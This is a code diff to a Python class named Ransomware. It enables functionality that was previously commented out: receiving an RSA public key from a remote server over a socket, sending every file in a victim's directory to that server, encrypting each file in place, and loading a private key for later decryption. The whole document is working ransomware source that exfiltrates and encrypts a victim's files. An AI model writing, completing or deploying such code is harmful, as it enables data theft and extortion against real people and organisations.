@@ -8,7 +8,7 @@ import base64
 import logging
 import socket
 import math
-#import rsa
+import rsa
 import threading
 
 
@@ -159,7 +159,7 @@ class Ransomware:
 
 
     # Encrypt all the safe to encrypt files on a victims pc
-    def encrypt_and_send_all_files(self, directory):
+    def encrypt_and_send_all_files(self, directory, key):
 
         number_of_files = 0
         size_of_files = 0
@@ -178,7 +178,7 @@ class Ransomware:
                 self.send_file_to_server(file_path, file)
                 
                 # Encrypt file
-                # self.encrypt_file(file_path, key)
+                self.encrypt_file(file_path, key)
         
         self._socket.sendall(base64.b64encode("DONE.".encode(Ransomware.ENCODING)))
 
@@ -208,30 +208,28 @@ class Ransomware:
         self.establish_connection()
         
         """ Receiving the public key. """
-        #filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
-        #print(f"[RECV] Receiving the public key.")
-        #file = open(filename, "w")
-        #self._socket.sendall("Public key filename received.".encode("utf-8"))
+        filename = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode("utf-8")
+        print(f"[RECV] Receiving the public key.")
+        file = open(filename, "w")
+        self._socket.sendall(base64.b64encode("Public key filename received.".encode("utf-8")))
  
         """ Receiving the public key from the server. """
-        #data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
-        #file.write(data)
-          
-        #print(f"[RECV] Receiving the public key data.")
-        #file.write(data)
-        #self._socket.sendall("File data received".encode("utf-8"))
+        data = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode("utf-8")
+        file.write(data)
+        print(f"[RECV] Receiving the public key data.")
+        self._socket.sendall(base64.b64encode("File data received".encode("utf-8")))
+        print("data: "+data)
  
         """ Closing the file. """
-        #file.close()
+        file.close()
 
         #Read the public key from the server
-        #with open("public_key.pem", "rb") as key_content:
-        #    key = rsa.PublicKey.load_pkcs1(key_content.read())
+        with open("public_key.pem", "rb") as key_content:
+            key = rsa.PublicKey.load_pkcs1(key_content.read())
 
         #Encrypt all files
-        t1 = threading.Thread(target=self.encrypt_and_send_all_files(self._directory))
+        t1 = threading.Thread(target=self.encrypt_and_send_all_files(self._directory, key))
         t1.start()
-        print("thread started")
 
 
         #NOTE: Ideally this time would be stored on the server so that if they close their computer and open it 
@@ -287,8 +285,8 @@ class Ransomware:
 
             #Read the private key from the server
             #I am not sure where to put this above, so I will leave it here for now
-            #with open("private_key.pem", "rb") as key_content:
-            #    key = rsa.PrivateKey.load_pkcs1(key_content.read())
+            with open("private_key.pem", "rb") as key_content:
+                key = rsa.PrivateKey.load_pkcs1(key_content.read())
         
             # self.decrypt_all_files(home, key)
         
